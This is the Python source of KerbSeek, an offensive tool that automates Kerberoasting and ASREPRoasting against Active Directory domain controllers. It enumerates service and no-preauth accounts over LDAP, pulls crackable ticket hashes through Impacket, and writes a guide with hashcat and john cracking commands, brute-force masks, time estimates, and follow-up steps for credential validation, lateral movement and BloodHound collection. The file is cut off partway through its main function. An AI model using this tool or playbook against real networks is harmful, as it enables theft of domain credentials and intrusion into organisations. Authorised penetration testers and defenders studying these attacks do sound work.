#!/usr/bin/env python3
"""
KerbSeek v1.0 - Kerberos Attack Discovery Tool
Automated Kerberoasting and ASREPRoasting

Features:
- Kerberoasting: Request TGS tickets for accounts with SPNs
- ASREPRoasting: Request AS-REP for accounts without pre-auth
- Ticket extraction and hash formatting
- Integration with Hashcat/John formats
- Ticket encryption analysis (RC4 vs AES)
- Automatic hash cracking preparation
- Domain trust enumeration

Usage:
    ./kerbseek.py --spns users.txt             # Kerberoast specific users
    ./kerbseek.py --asrep users.txt            # ASREPRoast specific users
    ./kerbseek.py --auto dclist.txt            # Auto-discover and attack
    ./kerbseek.py --domain DOMAIN -u user -p pass --kerberoast
    
Output:
    kerblist.txt        - Vulnerable accounts found
    tgs_hashes.txt      - Kerberoasting hashes (Hashcat format)
    asrep_hashes.txt    - ASREPRoast hashes (Hashcat format)
    tickets.txt         - Raw ticket data
    kerb_details.txt    - Detailed findings
    kerb_details.json   - JSON export
"""

import socket
import subprocess
import sys
import json
import re
import argparse
import base64
import ipaddress
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# Import shared utilities
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
from seek_utils import find_ip_list


# Color codes
GREEN = '\033[92m'
YELLOW = '\033[93m'
RED = '\033[91m'
BLUE = '\033[94m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
RESET = '\033[0m'
BOLD = '\033[1m'

# Kerberos ports
KERBEROS_PORTS = {
    88: 'Kerberos',
    464: 'Kerberos Change/Set Password'
}

# Encryption types
ENCRYPTION_TYPES = {
    1: 'DES-CBC-CRC',
    3: 'DES-CBC-MD5',
    17: 'AES128-CTS-HMAC-SHA1-96',
    18: 'AES256-CTS-HMAC-SHA1-96',
    23: 'RC4-HMAC',
    24: 'RC4-HMAC-EXP'
}

# Banner
BANNER = f"""{CYAN}{BOLD}
██╗  ██╗███████╗██████╗ ██████╗ ███████╗███████╗███████╗██╗  ██╗
██║ ██╔╝██╔════╝██╔══██╗██╔══██╗██╔════╝██╔════╝██╔════╝██║ ██╔╝
█████╔╝ █████╗  ██████╔╝██████╔╝███████╗█████╗  █████╗  █████╔╝ 
██╔═██╗ ██╔══╝  ██╔══██╗██╔══██╗╚════██║██╔══╝  ██╔══╝  ██╔═██╗ 
██║  ██╗███████╗██║  ██║██████╔╝███████║███████╗███████╗██║  ██╗
╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
{RESET}
{YELLOW}KerbSeek v1.0 - Kerberos Attack Discovery{RESET}
{BLUE}Automated Kerberoasting and ASREPRoasting{RESET}
{GREEN}github.com/Lokii-git/seeksweet{RESET}
"""


def print_banner():
    """Print the tool banner"""
    print(BANNER)


def read_user_list(file_path):
    """Read usernames or IPs from a file. Supports CIDR notation for IP addresses."""
    items = []
    try:
        with open(file_path, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    # Check if it's CIDR notation (for DC IP lists)
                    if '/' in line and '.' in line:
                        try:
                            network = ipaddress.ip_network(line, strict=False)
                            for ip in network.hosts():
                                items.append(str(ip))
                        except ValueError:
                            # Not valid CIDR, treat as regular item
                            items.append(line)
                    else:
                        items.append(line)
    except Exception as e:
        print(f"{RED}[!] Error reading file {file_path}: {e}{RESET}")
    return items


def check_kerberos_port(dc_ip, port=88, timeout=3):
    """Check if Kerberos port is open"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((dc_ip, port))
        sock.close()
        return result == 0
    except:
        return False


def get_domain_from_dc(dc_ip, timeout=10):
    """
    Get domain name from DC using ldapsearch
    Returns: domain name
    """
    try:
        cmd = ['ldapsearch', '-x', '-H', f'ldap://{dc_ip}',
               '-b', '', '-s', 'base', 'defaultNamingContext']
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        
        if result.returncode == 0:
            for line in result.stdout.split('\n'):
                if 'defaultNamingContext:' in line:
                    naming_context = line.split(':', 1)[1].strip()
                    dc_parts = [part.split('=')[1] for part in naming_context.split(',') if part.startswith('DC=')]
                    return '.'.join(dc_parts)
    except:
        pass
    return None


def request_tgs_ticket_impacket(domain, username, spn, dc_ip=None, user_for_auth=None, password=None, timeout=30):
    """
    Request TGS ticket using Impacket's GetUserSPNs.py
    Returns: dict with ticket info
    """
    result = {
        'username': username,
        'spn': spn,
        'hash': None,
        'encryption': None,
        'success': False
    }
    
    try:
        # Build GetUserSPNs.py command
        if user_for_auth and password:
            # Authenticated request
            cmd = ['GetUserSPNs.py', '-request', '-dc-ip', dc_ip,
                   f'{domain}/{user_for_auth}:{password}',
                   '-outputfile', f'tgs_{username}.txt']
        else:
            # Unauthenticated (usually won't work, but try)
            cmd = ['GetUserSPNs.py', '-request', '-no-pass', '-dc-ip', dc_ip,
                   f'{domain}/{username}']
        
        proc_result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        
        if proc_result.returncode == 0 or 'krb5tgs' in proc_result.stdout.lower():
            # Parse output for hash
            output = proc_result.stdout + proc_result.stderr
            
            # Look for Kerberos 5 TGS-REP hash
            hash_pattern = r'\$krb5tgs\$23\$[^\s]+'
            match = re.search(hash_pattern, output)
            
            if match:
                result['hash'] = match.group(0)
                result['success'] = True
                
                # Determine encryption type
                if '$23$' in result['hash']:
                    result['encryption'] = 'RC4-HMAC'
                elif '$17$' in result['hash']:
                    result['encryption'] = 'AES128'
                elif '$18$' in result['hash']:
                    result['encryption'] = 'AES256'
    
    except subprocess.TimeoutExpired:
        result['error'] = 'Timeout'
    except FileNotFoundError:
        result['error'] = 'GetUserSPNs.py not found (install impacket-scripts)'
    except Exception as e:
        result['error'] = str(e)
    
    return result


def request_asrep_ticket_impacket(domain, username, dc_ip=None, timeout=30):
    """
    Request AS-REP ticket using Impacket's GetNPUsers.py
    Returns: dict with ticket info
    """
    result = {
        'username': username,
        'hash': None,
        'encryption': None,
        'success': False
    }
    
    try:
        # Build GetNPUsers.py command
        cmd = ['GetNPUsers.py', domain + '/', '-usersfile', '-',
               '-format', 'hashcat', '-dc-ip', dc_ip, '-no-pass']
        
        # Pass username via stdin
        proc_result = subprocess.run(cmd, input=username, capture_output=True, 
                                    text=True, timeout=timeout)
        
        if proc_result.returncode == 0 or 'krb5asrep' in proc_result.stdout.lower():
            output = proc_result.stdout + proc_result.stderr
            
            # Look for Kerberos 5 AS-REP hash
            hash_pattern = r'\$krb5asrep\$23\$[^\s]+'
            match = re.search(hash_pattern, output)
            
            if match:
                result['hash'] = match.group(0)
                result['success'] = True
                result['encryption'] = 'RC4-HMAC' if '$23$' in result['hash'] else 'Unknown'
    
    except subprocess.TimeoutExpired:
        result['error'] = 'Timeout'
    except FileNotFoundError:
        result['error'] = 'GetNPUsers.py not found (install impacket-scripts)'
    except Exception as e:
        result['error'] = str(e)
    
    return result


def kerberoast_user(username, spn, domain, dc_ip, args):
    """
    Attempt to Kerberoast a single user
    Returns: dict with result
    """
    result = {
        'username': username,
        'spn': spn,
        'attack_type': 'kerberoast',
        'hash': None,
        'encryption': None,
        'status': 'failed'
    }
    
    try:
        ticket_result = request_tgs_ticket_impacket(
            domain, username, spn, dc_ip,
            args.username, args.password,
            timeout=args.timeout
        )
        
        if ticket_result['success']:
            result['hash'] = ticket_result['hash']
            result['encryption'] = ticket_result['encryption']
            result['status'] = 'success'
    
    except Exception as e:
        result['error'] = str(e)
    
    return result


def asreproast_user(username, domain, dc_ip, args):
    """
    Attempt to ASREPRoast a single user
    Returns: dict with result
    """
    result = {
        'username': username,
        'attack_type': 'asreproast',
        'hash': None,
        'encryption': None,
        'status': 'failed'
    }
    
    try:
        ticket_result = request_asrep_ticket_impacket(
            domain, username, dc_ip, timeout=args.timeout
        )
        
        if ticket_result['success']:
            result['hash'] = ticket_result['hash']
            result['encryption'] = ticket_result['encryption']
            result['status'] = 'success'
    
    except Exception as e:
        result['error'] = str(e)
    
    return result


def auto_discover_and_attack(dc_ip, args):
    """
    Auto-discover vulnerable accounts and attack them
    Requires ldapsearch for enumeration
    """
    results = []
    
    try:
        # Get domain name
        domain = get_domain_from_dc(dc_ip, timeout=args.timeout)
        if not domain:
            print(f"{RED}[!] Could not determine domain from {dc_ip}{RESET}")
            return results
        
        print(f"{CYAN}[*] Domain: {domain}{RESET}")
        
        # Get naming context
        cmd = ['ldapsearch', '-x', '-H', f'ldap://{dc_ip}',
               '-b', '', '-s', 'base', 'defaultNamingContext']
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=args.timeout)
        
        naming_context = None
        for line in result.stdout.split('\n'):
            if 'defaultNamingContext:' in line:
                naming_context = line.split(':', 1)[1].strip()
                break
        
        if not naming_context:
            print(f"{RED}[!] Could not get naming context{RESET}")
            return results
        
        # Enumerate users with SPNs (Kerberoastable)
        if args.kerberoast or args.auto:
            print(f"{CYAN}[*] Enumerating Kerberoastable accounts...{RESET}")
            
            ldap_filter = '(&(objectClass=user)(objectCategory=person)(servicePrincipalName=*))'
            cmd = ['ldapsearch', '-x', '-H', f'ldap://{dc_ip}',
                   '-b', naming_context, ldap_filter,
                   'sAMAccountName', 'servicePrincipalName']
            
            if args.username and args.password:
                cmd[2:2] = ['-D', args.username, '-w', args.password]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=args.timeout*2)
            
            current_user = None
            current_spns = []
            
            for line in result.stdout.split('\n'):
                if line.startswith('sAMAccountName:'):
                    if current_user and current_spns:
                        # Kerberoast this user
                        for spn in current_spns:
                            kerb_result = kerberoast_user(current_user, spn, domain, dc_ip, args)
                            if kerb_result['status'] == 'success':
                                results.append(kerb_result)
                                print(f"{GREEN}[+]{RESET} Kerberoasted: {current_user}")
                                break
                    
                    current_user = line.split(':', 1)[1].strip()
                    current_spns = []
                
                elif line.startswith('servicePrincipalName:'):
                    spn = line.split(':', 1)[1].strip()
                    current_spns.append(spn)
            
            # Don't forget the last user
            if current_user and current_spns:
                for spn in current_spns:
                    kerb_result = kerberoast_user(current_user, spn, domain, dc_ip, args)
                    if kerb_result['status'] == 'success':
                        results.append(kerb_result)
                        print(f"{GREEN}[+]{RESET} Kerberoasted: {current_user}")
                        break
        
        # Enumerate users without pre-auth (ASREPRoastable)
        if args.asreproast or args.auto:
            print(f"{CYAN}[*] Enumerating ASREPRoastable accounts...{RESET}")
            
            ldap_filter = '(&(objectClass=user)(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
            cmd = ['ldapsearch', '-x', '-H', f'ldap://{dc_ip}',
                   '-b', naming_context, ldap_filter, 'sAMAccountName']
            
            if args.username and args.password:
                cmd[2:2] = ['-D', args.username, '-w', args.password]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=args.timeout*2)
            
            for line in result.stdout.split('\n'):
                if line.startswith('sAMAccountName:'):
                    username = line.split(':', 1)[1].strip()
                    
                    asrep_result = asreproast_user(username, domain, dc_ip, args)
                    if asrep_result['status'] == 'success':
                        results.append(asrep_result)
                        print(f"{GREEN}[+]{RESET} ASREPRoasted: {username}")
    
    except Exception as e:
        print(f"{RED}[!] Error during auto-discovery: {e}{RESET}")
    
    return results


def save_kerblist(results, filename='kerblist.txt'):
    """Save list of vulnerable accounts"""
    try:
        with open(filename, 'w') as f:
            for result in results:
                if result['status'] == 'success':
                    f.write(f"{result['username']}\n")
        print(f"{GREEN}[+] Vulnerable account list saved to: {filename}{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error saving account list: {e}{RESET}")


def save_tgs_hashes(results, filename='tgs_hashes.txt'):
    """Save Kerberoasting hashes (Hashcat format)"""
    try:
        with open(filename, 'w') as f:
            for result in results:
                if result['status'] == 'success' and result['attack_type'] == 'kerberoast':
                    if result['hash']:
                        f.write(f"{result['hash']}\n")
        print(f"{GREEN}[+] TGS hashes saved to: {filename} (Hashcat mode 13100){RESET}")
    except Exception as e:
        print(f"{RED}[!] Error saving TGS hashes: {e}{RESET}")


def save_asrep_hashes(results, filename='asrep_hashes.txt'):
    """Save ASREPRoast hashes (Hashcat format)"""
    try:
        with open(filename, 'w') as f:
            for result in results:
                if result['status'] == 'success' and result['attack_type'] == 'asreproast':
                    if result['hash']:
                        f.write(f"{result['hash']}\n")
        print(f"{GREEN}[+] AS-REP hashes saved to: {filename} (Hashcat mode 18200){RESET}")
    except Exception as e:
        print(f"{RED}[!] Error saving AS-REP hashes: {e}{RESET}")


def save_details(results, filename='kerb_details.txt'):
    """Save detailed results"""
    try:
        with open(filename, 'w') as f:
            f.write("=" * 80 + "\n")
            f.write("KERBSEEK - Kerberos Attack Results\n")
            f.write(f"Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("=" * 80 + "\n\n")
            
            kerb_count = len([r for r in results if r['attack_type'] == 'kerberoast' and r['status'] == 'success'])
            asrep_count = len([r for r in results if r['attack_type'] == 'asreproast' and r['status'] == 'success'])
            
            f.write(f"Kerberoasting successes: {kerb_count}\n")
            f.write(f"ASREPRoasting successes: {asrep_count}\n\n")
            
            for result in results:
                if result['status'] == 'success':
                    f.write(f"\n{'=' * 80}\n")
                    f.write(f"Attack Type: {result['attack_type'].upper()}\n")
                    f.write(f"Username: {result['username']}\n")
                    if 'spn' in result:
                        f.write(f"SPN: {result['spn']}\n")
                    f.write(f"Encryption: {result.get('encryption', 'Unknown')}\n")
                    f.write(f"Hash: {result.get('hash', 'N/A')[:100]}...\n")
                    
                    # Cracking instructions
                    if result['attack_type'] == 'kerberoast':
                        f.write(f"\nCrack with Hashcat:\n")
                        f.write(f"  hashcat -m 13100 tgs_hashes.txt wordlist.txt\n")
                    else:
                        f.write(f"\nCrack with Hashcat:\n")
                        f.write(f"  hashcat -m 18200 asrep_hashes.txt wordlist.txt\n")
        
        print(f"{GREEN}[+] Detailed results saved to: {filename}{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error saving details: {e}{RESET}")


def save_json(results, filename='kerb_details.json'):
    """Save results as JSON"""
    try:
        with open(filename, 'w') as f:
            json.dump(results, f, indent=2)
        print(f"{GREEN}[+] JSON results saved to: {filename}{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error saving JSON: {e}{RESET}")


def save_kerberos_attack_guide(results, filename='KERBEROS_ATTACK_GUIDE.txt'):
    """Generate comprehensive Kerberos attack guide"""
    try:
        tgs_hashes = [r for r in results if r['attack_type'] == 'kerberoast' and r['status'] == 'success']
        asrep_hashes = [r for r in results if r['attack_type'] == 'asreproast' and r['status'] == 'success']
        
        if not tgs_hashes and not asrep_hashes:
            return
        
        # Analyze encryption types
        rc4_count = len([r for r in tgs_hashes if 'RC4' in r.get('encryption', '')])
        aes_count = len([r for r in tgs_hashes if 'AES' in r.get('encryption', '')])
        
        with open(filename, 'w') as f:
            f.write("=" * 80 + "\n")
            f.write("KERBEROS ATTACK GUIDE\n")
            f.write("=" * 80 + "\n\n")
            
            f.write(f"Kerberoasting Hashes: {len(tgs_hashes)}\n")
            f.write(f"ASREPRoasting Hashes: {len(asrep_hashes)}\n\n")
            
            if tgs_hashes:
                f.write("=" * 80 + "\n")
                f.write("KERBEROASTING HASH CRACKING\n")
                f.write("=" * 80 + "\n\n")
                
                f.write("📊 Encryption Analysis:\n")
                f.write("-" * 80 + "\n")
                f.write(f"RC4-HMAC (weak): {rc4_count} hashes\n")
                f.write(f"AES (strong): {aes_count} hashes\n\n")
                
                if rc4_count > 0:
                    f.write("✓ RC4 hashes are MUCH faster to crack (prioritize these)\n")
                    f.write("✓ Expected speed: ~1-10 GH/s on modern GPU\n\n")
                
                if aes_count > 0:
                    f.write("⚠ AES hashes are slower to crack\n")
                    f.write("⚠ Expected speed: ~100-500 MH/s on modern GPU\n\n")
                
                f.write("=" * 80 + "\n")
                f.write("METHOD 1: Hashcat (Recommended)\n")
                f.write("=" * 80 + "\n\n")
                
                f.write("Basic cracking:\n")
                f.write("hashcat -m 13100 tgs_hashes.txt /path/to/wordlist.txt\n\n")
                
                f.write("With rules (MUCH more effective):\n")
                f.write("hashcat -m 13100 tgs_hashes.txt /path/to/wordlist.txt -r /path/to/best64.rule\n\n")
                
                f.write("Common wordlists:\n")
                f.write("  • rockyou.txt - Most popular passwords\n")
                f.write("  • SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt\n")
                f.write("  • SecLists/Passwords/darkweb2017-top10000.txt\n\n")
                
                f.write("Brute force (if wordlist fails):\n")
                f.write("hashcat -m 13100 tgs_hashes.txt -a 3 ?u?l?l?l?l?d?d?d?d\n")
                f.write("  (Tries: Uppercase + 4 lowercase + 4 digits, e.g., Password1234)\n\n")
                
                f.write("Mask attack (common patterns):\n")
                f.write("hashcat -m 13100 tgs_hashes.txt -a 3 ?u?l?l?l?l?l?l?d?d\n")
                f.write("  (Tries: Uppercase + 6 lowercase + 2 digits, e.g., Welcome01)\n\n")
                
                f.write("Performance tuning:\n")
                f.write("hashcat -m 13100 tgs_hashes.txt wordlist.txt -O\n")
                f.write("  (-O = Optimized kernel, uses more GPU memory but faster)\n\n")
                
                f.write("Resume interrupted session:\n")
                f.write("hashcat -m 13100 tgs_hashes.txt wordlist.txt --session=kerb1 --restore\n\n")
                
                f.write("=" * 80 + "\n")
                f.write("METHOD 2: John the Ripper\n")
                f.write("=" * 80 + "\n\n")
                
                f.write("Basic cracking:\n")
                f.write("john --format=krb5tgs tgs_hashes.txt --wordlist=/path/to/wordlist.txt\n\n")
                
                f.write("With rules:\n")
                f.write("john --format=krb5tgs tgs_hashes.txt --wordlist=wordlist.txt --rules=Jumbo\n\n")
                
                f.write("Show cracked passwords:\n")
                f.write("john --format=krb5tgs tgs_hashes.txt --show\n\n")
                
                f.write("=" * 80 + "\n")
                f.write("CRACKING TIME ESTIMATES\n")
                f.write("=" * 80 + "\n\n")
                
                f.write("RC4-HMAC Hashes (Fast):\n")
                f.write("-" * 80 + "\n")
                f.write("Wordlist (rockyou.txt - 14M passwords):\n")
                f.write("  • RTX 3090: ~5 seconds\n")
                f.write("  • RTX 4090: ~3 seconds\n")
                f.write("  • GTX 1080: ~20 seconds\n\n")
                
                f.write("Brute force (8 chars, lowercase+digits):\n")
                f.write("  • RTX 3090: ~2 hours\n")
                f.write("  • RTX 4090: ~1 hour\n")
                f.write("  • GTX 1080: ~8 hours\n\n")
                
                f.write("AES Hashes (Slower):\n")
                f.write("-" * 80 + "\n")
                f.write("Wordlist (rockyou.txt - 14M passwords):\n")
                f.write("  • RTX 3090: ~30 seconds\n")
                f.write("  • RTX 4090: ~20 seconds\n")
                f.write("  • GTX 1080: ~2 minutes\n\n")
                
                f.write("Brute force (8 chars, lowercase+digits):\n")
                f.write("  • RTX 3090: ~12 hours\n")
                f.write("  • RTX 4090: ~8 hours\n")
                f.write("  • GTX 1080: ~48 hours\n\n")
                
                f.write("💡 TIP: Start with wordlist + rules. Only brute force if that fails.\n\n")
            
            if asrep_hashes:
                f.write("=" * 80 + "\n")
                f.write("ASREPROASTING HASH CRACKING\n")
                f.write("=" * 80 + "\n\n")
                
                f.write("=" * 80 + "\n")
                f.write("METHOD 1: Hashcat (Recommended)\n")
                f.write("=" * 80 + "\n\n")
                
                f.write("Basic cracking:\n")
                f.write("hashcat -m 18200 asrep_hashes.txt /path/to/wordlist.txt\n\n")
                
                f.write("With rules:\n")
                f.write("hashcat -m 18200 asrep_hashes.txt wordlist.txt -r /path/to/best64.rule\n\n")
                
                f.write("Brute force:\n")
                f.write("hashcat -m 18200 asrep_hashes.txt -a 3 ?u?l?l?l?l?d?d?d?d\n\n")
                
                f.write("Performance tuning:\n")
                f.write("hashcat -m 18200 asrep_hashes.txt wordlist.txt -O\n\n")
                
                f.write("=" * 80 + "\n")
                f.write("METHOD 2: John the Ripper\n")
                f.write("=" * 80 + "\n\n")
                
                f.write("Basic cracking:\n")
                f.write("john --format=krb5asrep asrep_hashes.txt --wordlist=/path/to/wordlist.txt\n\n")
                
                f.write("Show cracked:\n")
                f.write("john --format=krb5asrep asrep_hashes.txt --show\n\n")
                
                f.write("⚠ Note: AS-REP hashes typically use AES encryption (slower to crack)\n\n")
            
            f.write("=" * 80 + "\n")
            f.write("OPERATIONAL RECOMMENDATIONS\n")
            f.write("=" * 80 + "\n\n")
            
            f.write("🎯 Prioritization Strategy:\n")
            f.write("-" * 80 + "\n")
            if rc4_count > 0:
                f.write("1. Crack RC4 hashes first (much faster)\n")
                f.write("2. Start with rockyou.txt + best64.rule\n")
                f.write("3. If no success, try larger wordlists\n")
                f.write("4. Last resort: brute force short passwords\n\n")
            else:
                f.write("1. Start with rockyou.txt + best64.rule (AES hashes detected)\n")
                f.write("2. Try multiple rule sets (dive.rule, OneRuleToRuleThemAll)\n")
                f.write("3. Use hybrid attacks (wordlist + append digits/special chars)\n")
                f.write("4. Consider distributed cracking (long cracking time expected)\n\n")
            
            f.write("⏱ Time Management:\n")
            f.write("-" * 80 + "\n")
            f.write("• Wordlist attacks: Minutes to hours\n")
            f.write("• Rule-based attacks: Hours to days\n")
            f.write("• Brute force (8 chars): Hours to days\n")
            f.write("• Brute force (9+ chars): Days to weeks\n\n")
            
            f.write("🔧 Hardware Recommendations:\n")
            f.write("-" * 80 + "\n")
            f.write("• Use GPU cracking (100-1000x faster than CPU)\n")
            f.write("• RTX 30/40 series ideal for Kerberos hash cracking\n")
            f.write("• Multiple GPUs scale linearly (2 GPUs = 2x speed)\n")
            f.write("• Cloud GPU instances (AWS/Azure) viable for short jobs\n\n")
            
            f.write("💡 Pro Tips:\n")
            f.write("-" * 80 + "\n")
            f.write("• Service accounts often have weak/predictable passwords\n")
            f.write("• Check cracked passwords against other accounts (password reuse)\n")
            f.write("• RC4 hashes indicate legacy configurations (more vulnerable)\n")
            f.write("• Some orgs use patterns: ServiceName + Year + Special char\n")
            f.write("• Check for default passwords: Service123, Service2024, etc.\n\n")
            
            f.write("=" * 80 + "\n")
            f.write("AFTER CRACKING PASSWORDS\n")
            f.write("=" * 80 + "\n\n")
            
            f.write("Validate credentials:\n")
            f.write("crackmapexec smb <DC-IP> -u '<username>' -p '<password>'\n\n")
            
            f.write("Check user permissions:\n")
            f.write("crackmapexec smb <DC-IP> -u '<username>' -p '<password>' --shares\n")
            f.write("crackmapexec ldap <DC-IP> -u '<username>' -p '<password>' --users\n\n")
            
            f.write("Look for lateral movement opportunities:\n")
            f.write("crackmapexec smb <TARGET-RANGE> -u '<username>' -p '<password>'\n\n")
            
            f.write("Enumerate with credentials:\n")
            f.write("python3 ldapseek.py -i <DC-IP> --full -u '<DOMAIN>\\<username>' -p '<password>'\n\n")
            
            f.write("BloodHound collection:\n")
            f.write("bloodhound-python -u '<username>' -p '<password>' -d <DOMAIN> -dc <DC-IP> -c All\n\n")
            
            f.write("=" * 80 + "\n")
            f.write("WORDLIST RESOURCES\n")
            f.write("=" * 80 + "\n\n")
            
            f.write("Essential Wordlists:\n")
            f.write("-" * 80 + "\n")
            f.write("• rockyou.txt (14M passwords, most popular)\n")
            f.write("  Download: https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt\n\n")
            
            f.write("• SecLists (multiple wordlists)\n")
            f.write("  git clone https://github.com/danielmiessler/SecLists\n")
            f.write("  Common-Credentials/10-million-password-list-top-1000000.txt\n\n")
            
            f.write("• CrackStation (1.5B passwords, 15GB)\n")
            f.write("  Download: https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm\n\n")
            
            f.write("Rule Sets:\n")
            f.write("-" * 80 + "\n")
            f.write("• best64.rule (built-in, great starting point)\n")
            f.write("• dive.rule (aggressive mutations)\n")
            f.write("• OneRuleToRuleThemAll (comprehensive)\n")
            f.write("  git clone https://github.com/NotSoSecure/password_cracking_rules\n\n")
            
            f.write("=" * 80 + "\n")
            f.write("HASHCAT INSTALLATION\n")
            f.write("=" * 80 + "\n\n")
            
            f.write("Linux:\n")
            f.write("apt install hashcat\n")
            f.write("# OR download latest from https://hashcat.net/hashcat/\n\n")
            
            f.write("Windows:\n")
            f.write("Download: https://hashcat.net/hashcat/\n")
            f.write("Extract and run: hashcat.exe\n\n")
            
            f.write("GPU Drivers:\n")
            f.write("• NVIDIA: Install CUDA Toolkit + latest drivers\n")
            f.write("• AMD: Install ROCm drivers\n")
            f.write("• Test GPU: hashcat -I (should show your GPU)\n\n")
            
            f.write("=" * 80 + "\n")
            f.write("REFERENCES\n")
            f.write("=" * 80 + "\n\n")
            
            f.write("• Hashcat Wiki: https://hashcat.net/wiki/\n")
            f.write("• Kerberoasting Guide: https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting\n")
            f.write("• ASREPRoasting Guide: https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat\n")
            f.write("• Hashcat Examples: https://hashcat.net/wiki/doku.php?id=example_hashes\n")
            f.write("• John the Ripper: https://www.openwall.com/john/\n\n")
            
            f.write("=" * 80 + "\n")
            f.write("HASH DETAILS\n")
            f.write("=" * 80 + "\n\n")
            
            if tgs_hashes:
                f.write(f"Kerberoasting Targets ({len(tgs_hashes)}):\n")
                f.write("-" * 80 + "\n")
                for r in tgs_hashes[:20]:  # Limit to first 20
                    enc = r.get('encryption', 'Unknown')
                    f.write(f"• {r['username']:<30} | {enc:<20}\n")
                    if 'spn' in r:
                        f.write(f"  SPN: {r['spn']}\n")
                if len(tgs_hashes) > 20:
                    f.write(f"... and {len(tgs_hashes) - 20} more (see kerb_details.txt)\n")
                f.write("\n")
            
            if asrep_hashes:
                f.write(f"ASREPRoasting Targets ({len(asrep_hashes)}):\n")
                f.write("-" * 80 + "\n")
                for r in asrep_hashes[:20]:
                    f.write(f"• {r['username']}\n")
                if len(asrep_hashes) > 20:
                    f.write(f"... and {len(asrep_hashes) - 20} more (see kerb_details.txt)\n")
                f.write("\n")
        
        print(f"{GREEN}[+] Kerberos attack guide saved to: {filename}{RESET}")
        if rc4_count > 0:
            print(f"{YELLOW}[!] {rc4_count} RC4 hashes detected - these crack FAST!{RESET}")
        
    except Exception as e:
        print(f"{RED}[!] Error saving Kerberos attack guide: {e}{RESET}")


def main():
    parser = argparse.ArgumentParser(
        description='KerbSeek - Kerberos Attack Discovery',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Auto-discover and attack
  ./kerbseek.py --auto dclist.txt -u user@domain.com -p pass
  
  # Kerberoast specific users
  ./kerbseek.py --kerberoast --spns spn_users.txt -d domain.com --dc 10.0.0.1
  
  # ASREPRoast specific users
  ./kerbseek.py --asreproast --users asrep_users.txt -d domain.com --dc 10.0.0.1
  
  # Crack hashes
  hashcat -m 13100 tgs_hashes.txt rockyou.txt     # Kerberoasting
  hashcat -m 18200 asrep_hashes.txt rockyou.txt   # ASREPRoasting
        """
    )
    
    parser.add_argument('--auto', action='store_true', help='Auto-discover and attack (requires DC IP)')
    parser.add_argument('--kerberoast', action='store_true', help='Kerberoasting mode')
    parser.add_argument('--asreproast', action='store_true', help='ASREPRoasting mode')
    parser.add_argument('--spns', help='File with usernames that have SPNs')
    parser.add_argument('--users', help='File with usernames for ASREPRoasting')
    parser.add_argument('-d', '--domain', help='Domain name (e.g., contoso.com)')
    parser.add_argument('--dc', help='Domain Controller IP address')
    parser.add_argument('input_file', nargs='?', help='DC list file (for --auto mode)')
    parser.add_argument('-u', '--username', help='Username for authenticated requests (user@domain)')
    parser.add_argument('-p', '--password', help='Password for authenticated requests')
    parser.add_argument('-t', '--timeout', type=int, default=30, help='Timeout in seconds (default: 30)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    print_banner()
    
    # Validate arguments
    if args.auto:
        if not args.input_file:
            print(f"{RED}[!] --auto requires DC list file{RESET}")
            parser.print_help()
            sys.exit(1)
    elif args.kerberoast:
        if not args.spns or not args.domain or not args.dc:
            print(f"{RED}[!] --kerberoast requires --spns, --domain, and --dc{RESET}")
            parser.print_help()
            sys.exit(1)
    elif args.asreproast:
        if not args.users or not args.domain or not args.dc:
            print(f"{RED}[!] --asreproast requires --users, --domain, and --dc{RESET}")
            parser.print_help()
            sys.exit(1)
    else:
        parser.print_help()
        sys.exit(1)
    
    results = []
    
    try:
        if args.auto:
            # Auto-discovery mode
            dc_ips = read_user_list(args.input_file)
            
            print(f"{CYAN}[*] Starting auto-discovery mode...{RESET}")
            print(f"{CYAN}[*] Domain Controllers: {len(dc_ips)}{RESET}\n")
            
            completed = 0
            vulnerable_found = 0
            for dc_ip in dc_ips:
                completed += 1
                if check_kerberos_port(dc_ip, timeout=args.timeout):
                    print(f"{BLUE}[*]{RESET} Attacking {dc_ip}...")
                    dc_results = auto_discover_and_attack(dc_ip, args)
                    if dc_results:
                        vulnerable_found += len([r for r in dc_results if r['status'] == 'success'])
                    results.extend(dc_results)
                    
                    # Progress indicator
                    if completed % 5 == 0 or completed == len(dc_ips):
                        print(f"\n{CYAN}[*] Progress: {completed}/{len(dc_ips)} DCs ({vulnerable_found} vulnerable accounts){RESET}\n")
                elif args.verbose:
                    print(f"{RED}[!]{RESET} {dc_ip} - Kerberos port closed")
        
        elif args.kerberoast:
            # Kerberoasting mode
            usernames = read_user_list(args.spns)
            
            print(f"{CYAN}[*] Starting Kerberoasting...{RESET}")
            print(f"{CYAN}[*] Targets: {len(usernames)}{RESET}\n")
            
            for username in usernames:
                result = kerberoast_user(username, f'HTTP/{username}', args.domain, args.dc, args)
                results.append(result)
                
                if result['status'] == 'success':
                    print(f"{GREEN}[+]{RESET} {username} - Hash obtained")
                elif args.verbose:
                    print(f"{RED}[!]{RESET} {username} - Failed")
        
        elif args.asreproast:
            # ASREPRoasting mode
            usernames = read_user_list(args.users)
            
